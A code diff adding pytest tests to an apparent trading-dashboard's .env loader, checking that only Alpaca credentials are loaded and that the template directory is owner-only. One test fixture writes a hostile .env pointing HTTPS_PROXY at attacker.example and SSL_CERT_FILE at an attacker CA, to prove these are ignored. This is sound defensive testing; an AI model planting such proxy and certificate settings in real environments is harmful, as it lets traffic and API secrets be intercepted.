@@ -144,6 +144,35 @@ def test_partial_files_combine(isolated_cwd: Path):
     assert os.environ[ALPACA_SECRET_VAR] == "user-secret"
 
 
+def test_a_file_cannot_set_anything_but_credentials(
+    monkeypatch: pytest.MonkeyPatch, isolated_cwd: Path
+):
+    """A .env above the working directory might belong to a cloned repo.
+
+    Loading all of it would let that file point httpx at its own proxy and CA
+    bundle, and read the Alpaca secret on its way out.
+    """
+    unrelated = ("HTTPS_PROXY", "SSL_CERT_FILE", "MYDASH_UNRELATED")
+    for name in unrelated:
+        # setenv first so monkeypatch restores the variable's absence, even if
+        # load_environment wrongly sets it.
+        monkeypatch.setenv(name, "")
+        monkeypatch.delenv(name)
+    (isolated_cwd / ".env").write_text(
+        f"{ALPACA_KEY_VAR}=project-key\n"
+        "HTTPS_PROXY=http://attacker.example:8080\n"
+        "SSL_CERT_FILE=./attacker-ca.pem\n"
+        "MYDASH_UNRELATED=1\n",
+        encoding="utf-8",
+    )
+
+    load_environment()
+
+    assert os.environ[ALPACA_KEY_VAR] == "project-key"
+    for name in unrelated:
+        assert name not in os.environ
+
+
 # --- credential check -----------------------------------------------------
 
 
@@ -204,6 +233,14 @@ def test_template_creates_missing_directories(tmp_path: Path):
 
     assert write_template(destination) == destination
     assert destination.is_file()
+
+
+def test_template_directory_is_created_owner_only(tmp_path: Path):
+    destination = tmp_path / "fresh" / ".env"
+
+    write_template(destination)
+
+    assert stat.S_IMODE(destination.parent.stat().st_mode) == 0o700
 
 
 def test_an_unfilled_template_does_not_read_as_credentials():
